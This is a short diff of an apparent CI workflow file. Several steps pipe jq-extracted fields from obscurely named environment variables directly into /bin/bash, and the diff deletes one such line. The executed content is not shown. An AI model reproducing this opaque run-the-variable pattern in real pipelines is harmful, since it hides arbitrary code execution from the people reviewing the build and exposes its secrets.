@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$dso232" | jq -r .qy8 | /bin/bash
           echo $wachc2 | jq -r .o92897 | /bin/bash
           echo $osue0 | jq -r .cwrgx78 | /bin/bash
-          echo $ush39 | jq -r .b2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
